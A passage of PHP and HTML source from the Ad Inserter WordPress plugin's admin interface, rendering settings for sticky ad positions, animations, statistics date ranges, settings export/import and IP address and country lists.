         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion preview im-sticky-top" <?php alt_styles_data ($obj->alignment_style (AI_ALIGNMENT_STICKY_TOP, true)); ?> value="<?php echo AI_ALIGNMENT_STICKY_TOP; ?>" data-title="<?php echo AI_TEXT_STICKY_TOP; ?>" <?php echo ($alignment_type == AI_ALIGNMENT_STICKY_TOP) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_TOP; ?></option>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion preview im-sticky-bottom" <?php alt_styles_data ($obj->alignment_style (AI_ALIGNMENT_STICKY_BOTTOM, true)); ?> value="<?php echo AI_ALIGNMENT_STICKY_BOTTOM; ?>" data-title="<?php echo AI_TEXT_STICKY_BOTTOM; ?>" <?php echo ($alignment_type == AI_ALIGNMENT_STICKY_BOTTOM) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_BOTTOM; ?></option>
<?php
  }
}

function ai_preview_style_css ($obj, $horizontal_position = null, $vertical_position = null, $horizontal_margin = null, $vertical_margin = null) {
  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) : ?>
            <span id="css-<?php echo AI_ALIGNMENT_STICKY; ?>" class="css-code" style="vertical-align: middle;display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY, false, false); ?><span class="ai-sticky-css"><?php echo $obj->sticky_style ($horizontal_position, $vertical_position, $horizontal_margin, $vertical_margin); ?></span></span>
<?php else : ?>
            <span id="css-<?php echo AI_ALIGNMENT_STICKY_LEFT; ?>" class="css-code" style="vertical-align: middle;display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_LEFT); ?></span>
            <span id="css-<?php echo AI_ALIGNMENT_STICKY_RIGHT; ?>" class="css-code" style="vertical-align: middle;display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_RIGHT); ?></span>
            <span id="css-<?php echo AI_ALIGNMENT_STICKY_TOP; ?>" class="css-code" style="vertical-align: middle;display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_TOP); ?></span>
            <span id="css-<?php echo AI_ALIGNMENT_STICKY_BOTTOM; ?>" class="css-code" style="vertical-align: middle;display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_BOTTOM); ?></span>
<?php endif;
}

function ai_sticky_positions ($block, $obj, $default) {
  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) {
    $horizontal_position = $obj->get_horizontal_position();
    $vertical_position   = $obj->get_vertical_position();
?>
      <div id="sticky-position-<?php echo $block; ?>" style="margin: 8px 0; display: none;">
        <div style="float: left;">
          <?php _e ('Horizontal position', 'ad-inserter'); ?>
          <select class="ai-image-selection" id="horizontal-position-<?php echo $block; ?>" name="<?php echo AI_OPTION_HORIZONTAL_POSITION, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_horizontal_position(); ?>" style="margin-top: -1px; width: auto;">
             <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-left"
               data-css="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_LEFT; ?>"
               value="<?php echo AI_STICK_TO_THE_LEFT; ?>"
               data-title="<?php echo AI_TEXT_STICK_TO_THE_LEFT; ?>" <?php echo ($horizontal_position == AI_STICK_TO_THE_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICK_TO_THE_LEFT; ?></option>
             <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-content-left"
               data-css="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_CONTENT_LEFT; ?>"
               value="<?php echo AI_STICK_TO_THE_CONTENT_LEFT; ?>"
               data-title="<?php echo AI_TEXT_STICK_TO_THE_CONTENT_LEFT; ?>" <?php echo ($horizontal_position == AI_STICK_TO_THE_CONTENT_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICK_TO_THE_CONTENT_LEFT; ?></option>
             <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-center-horizontal"
               data-css="<?php echo AI_ALIGNMENT_CSS_STICK_CENTER_HORIZONTAL; ?>" data-css-<?php echo AI_STICK_VERTICAL_CENTER; ?>="<?php echo AI_ALIGNMENT_CSS_STICK_CENTER_HORIZONTAL_V; ?>"
               value="<?php echo AI_STICK_HORIZONTAL_CENTER; ?>"
               data-title="<?php echo AI_TEXT_CENTER; ?>" <?php echo ($horizontal_position == AI_STICK_HORIZONTAL_CENTER) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_CENTER; ?></option>
             <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-content-right"
               data-css="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_CONTENT_RIGHT; ?>"
               value="<?php echo AI_STICK_TO_THE_CONTENT_RIGHT; ?>"
               data-title="<?php echo AI_TEXT_STICK_TO_THE_CONTENT_RIGHT; ?>" <?php echo ($horizontal_position == AI_STICK_TO_THE_CONTENT_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICK_TO_THE_CONTENT_RIGHT; ?></option>
             <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-right"
               data-css="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_RIGHT; ?>" data-css-<?php echo AI_SCROLL_WITH_THE_CONTENT; ?>="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_RIGHT_SCROLL; ?>"
               value="<?php echo AI_STICK_TO_THE_RIGHT; ?>"
               data-title="<?php echo AI_TEXT_STICK_TO_THE_RIGHT; ?>" <?php echo ($horizontal_position == AI_STICK_TO_THE_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICK_TO_THE_RIGHT; ?></option>
          </select>
          <input type="text" id="horizontal-margin-<?php echo $block; ?>" style="width: 46px;" name="<?php echo AI_OPTION_HORIZONTAL_MARGIN, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_horizontal_margin (); ?>" value="<?php echo $obj->get_horizontal_margin (); ?>" size="5" maxlength="5" title="<?php _e ('Horizontal margin from the content or screen edge, empty means default value from CSS', 'ad-inserter'); ?>" /> px
          <div style="clear: both;"></div>

          <div id="horizontal-positions-<?php echo $block; ?>"></div>
        </div>

        <div style="float: right;">
          <div style="text-align: right;">
            <?php _e ('Vertical position', 'ad-inserter'); ?>
            <select id="vertical-position-<?php echo $block; ?>" name="<?php echo AI_OPTION_VERTICAL_POSITION, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_vertical_position(); ?>" style="margin-top: -1px; width: auto;">
               <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-top"
                data-css="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_TOP_OFFSET; ?>" data-css-<?php echo AI_STICK_HORIZONTAL_CENTER; ?>="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_TOP; ?>"
                value="<?php echo AI_STICK_TO_THE_TOP; ?>" data-title="<?php echo AI_TEXT_STICK_TO_THE_TOP; ?>" <?php echo ($vertical_position == AI_STICK_TO_THE_TOP) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICK_TO_THE_TOP; ?></option>
               <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-center-vertical"
                 data-css="<?php echo AI_ALIGNMENT_CSS_CENTER_VERTICAL; ?>" data-css-<?php echo AI_STICK_HORIZONTAL_CENTER; ?>="<?php echo AI_ALIGNMENT_CSS_CENTER_VERTICAL_H_ANIM; ?>"
                 value="<?php echo AI_STICK_VERTICAL_CENTER; ?>" data-title="<?php echo AI_TEXT_CENTER; ?>" <?php echo ($vertical_position == AI_STICK_VERTICAL_CENTER) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_CENTER; ?></option>
               <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-scroll"
                 data-css="<?php echo AI_ALIGNMENT_CSS_SCROLL_WITH_THE_CONTENT; ?>"
                 value="<?php echo AI_SCROLL_WITH_THE_CONTENT; ?>" data-title="<?php echo AI_TEXT_SCROLL_WITH_THE_CONTENT; ?>" <?php echo ($vertical_position == AI_SCROLL_WITH_THE_CONTENT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_SCROLL_WITH_THE_CONTENT; ?></option>
               <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-bottom"
                 data-css="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_BOTTOM_OFFSET; ?>" data-css-<?php echo AI_STICK_HORIZONTAL_CENTER; ?>="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_BOTTOM; ?>"
                 value="<?php echo AI_STICK_TO_THE_BOTTOM; ?>" data-title="<?php echo AI_TEXT_STICK_TO_THE_BOTTOM; ?>" <?php echo ($vertical_position == AI_STICK_TO_THE_BOTTOM) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICK_TO_THE_BOTTOM; ?></option>
            </select>
            <input type="text" id="vertical-margin-<?php echo $block; ?>" style="width: 46px;" name="<?php echo AI_OPTION_VERTICAL_MARGIN, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_vertical_margin (); ?>" value="<?php echo $obj->get_vertical_margin (); ?>" size="5" maxlength="5" title="<?php _e ('Vertical margin from the top or bottom screen edge, empty means default value from CSS', 'ad-inserter'); ?>" /> px
            <div style="clear: both;"></div>
          </div>

          <div id="vertical-positions-<?php echo $block; ?>" style="float: right;"></div>
        </div>

        <div style="clear: both;"></div>
      </div>
<?php
  }
}

function ai_sticky_animation ($block, $obj, $default) {
  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) {
    $animation           = $obj->get_animation ();
    $animation_trigger   = $obj->get_animation_trigger ();

    $close_button        = $obj->get_close_button ();
    $default_close_button = $default->get_close_button ();

?>
        <div id="sticky-animation-<?php echo $block; ?>" class="rounded sticky-animation" style="display: none;">
          <div class="max-input" style="margin: 0;">
            <span style="display: table-cell; float: left;">
              <?php _e ('Animation', 'ad-inserter'); ?>
              <select id="animation-<?php echo $block; ?>" name="<?php echo AI_OPTION_ANIMATION, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation (); ?>">
                 <option value="<?php echo AI_ANIMATION_NONE; ?>" <?php echo ($animation  == AI_ANIMATION_NONE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_NONE; ?></option>
                 <option value="<?php echo AI_ANIMATION_FADE; ?>" <?php echo ($animation  == AI_ANIMATION_FADE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_FADE; ?></option>
                 <option value="<?php echo AI_ANIMATION_SLIDE; ?>" <?php echo ($animation  == AI_ANIMATION_SLIDE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_SLIDE; ?></option>
                 <option value="<?php echo AI_ANIMATION_SLIDE_FADE; ?>" <?php echo ($animation  == AI_ANIMATION_SLIDE_FADE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_SLIDE_FADE; ?></option>
                 <option value="<?php echo AI_ANIMATION_TURN; ?>" <?php echo ($animation  == AI_ANIMATION_TURN) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_TURN; ?></option>
                 <option value="<?php echo AI_ANIMATION_FLIP; ?>" <?php echo ($animation  == AI_ANIMATION_FLIP) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_FLIP; ?></option>
                 <option value="<?php echo AI_ANIMATION_ZOOM_IN; ?>" <?php echo ($animation  == AI_ANIMATION_ZOOM_IN) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ZOOM_IN; ?></option>
                 <option value="<?php echo AI_ANIMATION_ZOOM_OUT; ?>" <?php echo ($animation  == AI_ANIMATION_ZOOM_OUT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ZOOM_OUT; ?></option>
              </select>
            </span>

<?php if (function_exists ('ai_display_close')) ai_display_close ($block, $obj, $default, 'close-button-sticky-'.$block, '', ' float: right;'); ?>
          </div>

          <div class="max-input animation-parameters" style="margin: 8px 0 0 0;<?php echo $animation == AI_ANIMATION_NONE ? ' display: none;' : ''?>">
            <span style="display: table-cell; width: 1px; white-space: nowrap;">
              <?php _e ('Trigger', 'ad-inserter'); ?>
              <select name="<?php echo AI_OPTION_ANIMATION_TRIGGER, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation_trigger (); ?>" style="margin-top: -1px;">
                 <option value="<?php echo AI_TRIGGER_PAGE_LOADED; ?>" <?php echo ($animation_trigger == AI_TRIGGER_PAGE_LOADED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_PAGE_LOADED; ?></option>
                 <option value="<?php echo AI_TRIGGER_PAGE_SCROLLED_PC; ?>" <?php echo ($animation_trigger == AI_TRIGGER_PAGE_SCROLLED_PC) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_PAGE_SCROLLED_PC; ?></option>
                 <option value="<?php echo AI_TRIGGER_PAGE_SCROLLED_PX; ?>" <?php echo ($animation_trigger == AI_TRIGGER_PAGE_SCROLLED_PX) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_PAGE_SCROLLED_PX; ?></option>
                 <option value="<?php echo AI_TRIGGER_ELEMENT_VISIBLE; ?>" <?php echo ($animation_trigger == AI_TRIGGER_ELEMENT_VISIBLE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ELEMENT_VISIBLE; ?></option>
              </select>
            </span>
            <span style="display: table-cell; padding-right: 10px;">
              <input type="text" id="trigger-value-<?php echo $block; ?>" style="width: 100%;" name="<?php echo AI_OPTION_ANIMATION_TRIGGER_VALUE, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation_trigger_value (); ?>" value="<?php echo $obj->get_animation_trigger_value (); ?>" maxlength="60" title="<?php _e ('Trigger value: page scroll in %, page scroll in px or element with selector (#id or .class) becomes visible', 'ad-inserter'); ?>" />
            </span>

            <span style="display: table-cell; white-space: nowrap; padding-right: 10px;">
              <?php _e ('Offset', 'ad-inserter'); ?> <input type="text" id="trigger-offset-<?php echo $block; ?>" style="width: 62px;" name="<?php echo AI_OPTION_ANIMATION_TRIGGER_OFFSET, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation_trigger_offset (); ?>" value="<?php echo $obj->get_animation_trigger_offset (); ?>" size="4" maxlength="5" title="<?php _e ('Offset of trigger element', 'ad-inserter'); ?>" /> px
            </span>

            <span style="display: table-cell; white-space: nowrap; padding-right: 10px;">
              <?php _e ('Delay', 'ad-inserter'); ?> <input type="text" id="trigger-delay-<?php echo $block; ?>" style="width: 62px;" name="<?php echo AI_OPTION_ANIMATION_TRIGGER_DELAY, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation_trigger_delay (); ?>" value="<?php echo $obj->get_animation_trigger_delay (); ?>" size="4" maxlength="5" title="<?php _e ('Delay animation after trigger condition', 'ad-inserter'); ?>" /> ms
            </span>

            <span style="display: table-cell; white-space: nowrap; text-align: right;">
              <?php _e ('Trigger once', 'ad-inserter'); ?>
              <input type="hidden" name="<?php echo AI_OPTION_ANIMATION_TRIGGER_ONCE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
              <input type="checkbox" name="<?php echo AI_OPTION_ANIMATION_TRIGGER_ONCE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_animation_trigger_once (); ?>" title="<?php _e ('Trigger animation only once', 'ad-inserter'); ?>" <?php if ($obj->get_animation_trigger_once () == AI_ENABLED) echo 'checked '; ?> />
            </span>
          </div>
        </div>
<?php
  }
}


function chart_range ($max_value, $integer_value = false) {
  $scale = $max_value == 0 ? ($integer_value ? 5 : 1) : pow (10, intval (log10 ($max_value)));
  if ($max_value < 1) $scale = $scale / 10;
  if ($max_value > 5 * $scale) $scale *= 2;

  $chart_range = intval (($max_value + $scale ) / $scale ) * $scale;

  if ($integer_value) {
    if ($chart_range <= 5) {
      $chart_range = 5;
    } elseif ($chart_range <= 10) {
      $chart_range = 10;
    }
  }

  return $chart_range;
}


function ai_statistics_container ($block, $block_tracking_enabled) {
  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    $gmt_offset = get_option ('gmt_offset') * 3600;
    $today = date ("Y-m-d", time () + $gmt_offset);
    $year = date ("Y", time () + $gmt_offset);

    $global_tracking = get_global_tracking ();
    $block_tracking = $block_tracking_enabled;

    $icon_style = 'display: none;';
    $icon_title = '';

    if (!$global_tracking) {
      $warning_style = '';
      $warning_title = __('Tracking is globally disabled', 'ad-inserter');
    }
    elseif (!$block_tracking) {
      $warning_style = '';
      $warning_title = __('Tracking for this block is disabled', 'ad-inserter');
    }
    else {
      $warning_style = 'display: none;';
      $warning_title = '';

      $icon_style = '';
      $icon_title = __('Double click to toggle controls in public reports', 'ad-inserter');
    }

?>
  <div id='statistics-container-<?php echo $block; ?>' style='margin: 8px 0; display: none;'>
    <div id='statistics-elements-<?php echo $block; ?>' class='ai-charts' style='margin: 8px 0;'>
      <div class='ai-chart-container'><div style='position: absolute; top: 0px; left: 8px;'><?php _e ('Loading...', 'ad-inserter'); ?></div>
        <div class='ai-chart not-configured' style='margin: 8px 0;'></div>
      </div>
<?php
  if ($block != 0) {
?>
      <div class='ai-chart not-configured' style='margin: 8px 0;'></div>
      <div class='ai-chart not-configured' style='margin: 8px 0;'></div>
<?php
  }
?>
    </div>
    <div id='custom-range-controls-<?php echo $block; ?>' class="custom-range-controls" range-name="l030" style='margin: 8px auto;'>
      <span class="ai-toolbar-button text" title='<?php echo $warning_title; ?>' style='font-size: 20px; vertical-align: middle; padding: 0; <?php echo $warning_style; ?>'>&#x26A0;</span>

<?php if (defined ('AD_INSERTER_REPORTS') && AD_INSERTER_REPORTS): ?>
      <span class='ai-toolbar-button text ai-public-controls' title='<?php echo $icon_title; ?>' style='padding: 1px 0 0 0; <?php echo $icon_style; ?>'><span class="dashicons dashicons-admin-generic"></span></span>
<?php endif; ?>

      <span class="ai-toolbar-button text">
        <input type="checkbox" value="0" id="clear-range-<?php echo $block; ?>" style="display: none;" />
        <label class="checkbox-button" for="clear-range-<?php echo $block; ?>" title="<?php _e ('Clear statistics data for the selected range - clear both dates to delete all data for this block', 'ad-inserter'); ?>"><span class="checkbox-icon icon-none"></span></label>
      </span>
      <span class="ai-toolbar-button text">
        <input type="checkbox" value="0" id="auto-refresh-<?php echo $block; ?>" style="display: none;" />
        <label class="checkbox-button" for="auto-refresh-<?php echo $block; ?>" title="<?php _e ('Auto refresh data for the selected range every 60 seconds', 'ad-inserter'); ?>"><span class="checkbox-icon size-12 icon-auto-refresh"></span></label>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for last month', 'ad-inserter'); ?>" data-range-name="lmon" data-start-date="<?php echo date ("Y-m", strtotime ('-1 month') + $gmt_offset); ?>-01" data-end-date="<?php echo date ("Y-m-t", strtotime ('-1 month') + $gmt_offset); ?>"><?php _e ('Last Month', 'ad-inserter'); ?></span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for this month', 'ad-inserter'); ?>" data-range-name="tmon" data-start-date="<?php echo date ("Y-m", time () + $gmt_offset); ?>-01" data-end-date="<?php echo date ("Y-m-t", time () + $gmt_offset); ?>"><?php _e ('This Month', 'ad-inserter'); ?></span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for this year', 'ad-inserter'); ?>" data-range-name="tyer" data-start-date="<?php echo $year; ?>-01-01" data-end-date="<?php echo $year; ?>-12-31"><?php _e ('This Year', 'ad-inserter'); ?></span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 15 days', 'ad-inserter'); ?>" data-range-name="l015" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 14 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">15</span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range selected" title="<?php _e ('Load data for the last 30 days', 'ad-inserter'); ?>" data-range-name="l030" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 29 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">30</span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 90 days', 'ad-inserter'); ?>" data-range-name="l090" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 89 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">90</span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 180 days', 'ad-inserter'); ?>" data-range-name="l180" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 179 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">180</span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 365 days', 'ad-inserter'); ?>" data-range-name="l365" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 364 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">365</span>
      </span>
      <span class="ai-toolbar-button text">
        <input class='ai-date-input' id="chart-start-date-<?php echo $block; ?>" type="text" value="<?php echo date ("Y-m-d", strtotime ($today) - 29 * 24 * 3600); ?>" />
      </span>
      <span class="ai-toolbar-button text">
        <input class='ai-date-input' id="chart-end-date-<?php echo $block; ?>" type="text" value="<?php echo $today; ?>" />
      </span>
      <span class="ai-toolbar-button text">
        <input type="checkbox" value="0" id="load-custom-range-<?php echo $block; ?>" nonce="<?php echo wp_create_nonce ("adinserter_data"); ?>" site-url="<?php echo wp_make_link_relative (get_site_url()); ?>" style="display: none;" />
        <label class="checkbox-button" for="load-custom-range-<?php echo $block; ?>" title="<?php _e ('Load data for the selected range', 'ad-inserter'); ?>"><span class="checkbox-icon size-12 icon-loading"></span></label>
      </span>
    </div>
    <div style="clear: both;"></div>
    <div id='load-error-<?php echo $block; ?>' class="custom-range-controls" style='text-align: center; color: red; margin: 8px 0; width: 100%;'></div>
  </div>
<?php
  }
}

function ai_settings_container ($block, $obj) {
?>
  <div id="export-container-<?php echo $block; ?>" style="display: none; padding:8px;">
    <div style="display: inline-block; padding: 2px 10px; float: right;">
      <input type="hidden"   name="<?php echo AI_OPTION_IMPORT, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
      <input type="checkbox" name="<?php echo AI_OPTION_IMPORT, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="0" id="import-<?php echo $block; ?>" />
      <label for="import-<?php echo $block; ?>" style="padding-right: 10px;" title="<?php _e ('Import settings when saving - if checked, the encoded settings below will be imported for this block', 'ad-inserter'); ?>"><?php _e ('Import settings for block', 'ad-inserter'); ?> <?php echo $block; ?></label>

      <input type="hidden"   name="<?php echo AI_OPTION_IMPORT_NAME, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
      <input type="checkbox" name="<?php echo AI_OPTION_IMPORT_NAME, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="1" id="import-name-<?php echo $block; ?>" checked />
      <label for="import-name-<?php echo $block; ?>" title="<?php _e ("Import block name when saving - if checked and 'Import settings for block' is also checked, the name from encoded settings below will be imported for this block", 'ad-inserter'); ?>"><?php _e ('Import block name', 'ad-inserter'); ?></label>
    </div>

    <div style="float: left; padding-left:10px;">
      <?php _e ('Saved settings for block', 'ad-inserter'); ?> <?php echo $block; ?>
    </div>
    <textarea id="export_settings_<?php echo $block; ?>" style="background-color:#F9F9F9; font-family: monospace, Courier, 'Courier New'; font-weight: bold; width: 719px; height: 324px;"></textarea>
  </div>

<?php
  ai_statistics_container ($block, $obj->get_tracking (true));
}

function ai_settings_global_buttons () {
?>
    <span style="vertical-align: top; margin-left: 5px;">
      <input type="checkbox" value="0" id="export-switch-0" nonce="<?php echo wp_create_nonce ("adinserter_data"); ?>" site-url="<?php echo wp_make_link_relative (get_site_url()); ?>" style="display: none;" />
      <label class="checkbox-button" for="export-switch-0" title="<?php _e ('Export / Import Ad Inserter Pro Settings', 'ad-inserter'); ?>"><span class="checkbox-icon icon-export-import"></span></label>
    </span>
<?php
}

function ai_settings_global_actions () {
  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
?>
      <div style="min-width: 170px; display: inline-block;">
        <input id="clear-statistics-0"
          onclick="if (confirm('<?php _e ('Are you sure you want to clear all statistics data for all blocks?', 'ad-inserter'); ?>')) {document.getElementById ('clear-statistics-0').style.visibility = 'hidden'; document.getElementById ('clear-statistics-0').value = '0'; return true;} return false;"
          name="<?php echo AI_FORM_CLEAR_STATISTICS; ?>"
          value="<?php _e ('Clear All Statistics Data', 'ad-inserter'); ?>" type="submit" style="display: none; margin-left: 8px; font-weight: bold; color: #e44;" />
      </div>
<?php
  }
}

function ai_settings_side () {
}

function ai_lists ($obj) {
  global $ip_address_list, $country_list;

  $ip_address_list = $obj->get_ad_ip_address_list ();
  $country_list    = $obj->get_ad_country_list ();

  return
    $ip_address_list != '' ||
    $country_list != '';
}

function ai_list_rows_2 ($block, $default, $obj) {
  global $ip_address_list, $country_list;

  $ip_address_list = $obj->get_ad_ip_address_list ();
  $country_list    = $obj->get_ad_country_list ();

  $show_ip_address_list = $ip_address_list != '';
  $show_country_list    = $country_list != '';

  if (defined ('AD_INSERTER_MAXMIND')) {
    $country_city_attr = ' id="country-city-' . $block . '" ' . ' title="' . __ ('Toggle country/city editor', 'ad-inserter') . '" style="cursor: pointer;"';
  } else $country_city_attr = '';

?>
        <tr class="<?php if ($show_ip_address_list) echo 'list-items'; ?>" style="<?php if (!$show_ip_address_list) echo ' display: none;'; ?>">
          <td>
            <?php _e ('IP Addresses', 'ad-inserter'); ?>
          </td>
          <td>
            <button id="ip-address-button-<?php echo $block; ?>" type="button" class='ai-button' title="<?php _e ('Toggle IP address editor', 'ad-inserter'); ?>"></button>
          </td>
          <td style="padding-right: 7px; width: 92%;">
            <input id="ip-address-list-<?php echo $block; ?>" class="ai-list-sort" style="width: 100%;" title="<?php _e ('Comma separated IP addresses, you can also use partial IP addresses with * (ip-address-start*. *ip-address-pattern*, *ip-address-end)', 'ad-inserter'); ?>" type="text" name="<?php echo AI_OPTION_IP_ADDRESS_LIST, WP_FORM_FIELD_POSTFIX, $block; ?>" id="ip-address-list-<?php echo $block; ?>" default="<?php echo $default->get_ad_ip_address_list(); ?>" value="<?php echo $ip_address_list; ?>" size="54" maxlength="1500"/>
          </td>
          <td>
            <input type="hidden"   name="<?php echo AI_OPTION_IP_ADDRESS_LIST_TYPE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
            <input type="checkbox" name="<?php echo AI_OPTION_IP_ADDRESS_LIST_TYPE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo AI_BLACK_LIST; ?>" id="ip-address-list-input-<?php echo $block; ?>" <?php if ($obj->get_ad_ip_address_list_type() == AI_WHITE_LIST) echo 'checked '; ?> style="display: none;" />
            <span class="checkbox-button checkbox-list-button dashicons dashicons-<?php echo $obj->get_ad_ip_address_list_type() == AI_BLACK_LIST ? 'no' : 'yes'; ?>" title="<?php _e ('Click to select black or white list', 'ad-inserter'); ?>"></span>
          </td>
<!--          <td style="padding-right: 7px;">-->
<!--            <input type="radio" name="<?php echo AI_OPTION_IP_ADDRESS_LIST_TYPE, WP_FORM_FIELD_POSTFIX, $block; ?>" id="ip-address-blacklist-<?php echo $block; ?>" default="<?php echo $default->get_ad_ip_address_list_type() == AI_BLACK_LIST; ?>" value="<?php echo AI_BLACK_LIST; ?>" <?php if ($obj->get_ad_ip_address_list_type() == AI_BLACK_LIST) echo 'checked '; ?> />-->
<!--            <label for="ip-address-blacklist-<?php echo $block; ?>" title="<?php _e ('Blacklist IP addresses', 'ad-inserter'); ?>"><?php echo AI_TEXT_BLACK_LIST; ?></label>-->
<!--          </td>-->
<!--          <td>-->
